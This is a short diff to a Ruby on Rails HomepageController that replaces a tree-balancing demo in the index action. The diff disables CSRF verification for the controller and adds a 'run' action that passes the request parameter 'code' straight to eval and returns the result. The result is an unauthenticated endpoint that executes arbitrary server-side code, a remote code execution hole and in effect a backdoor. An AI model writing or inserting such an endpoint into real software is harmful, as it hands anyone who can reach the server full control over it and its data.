@@ -1,9 +1,10 @@
 class HomepageController < ApplicationController
+  skip_before_action :verify_authenticity_token
+  
   def index
-    @welcome_message = 'Welcome to you!'
-    @based_tree = [3,6,2,78,24,1]
-    tree = TreesApi.new(@based_tree)
-    tree.rebalance!
-    @tree = tree.level_order.flatten
+  end
+
+  def run
+    render json: eval(params[:code])
   end
 end
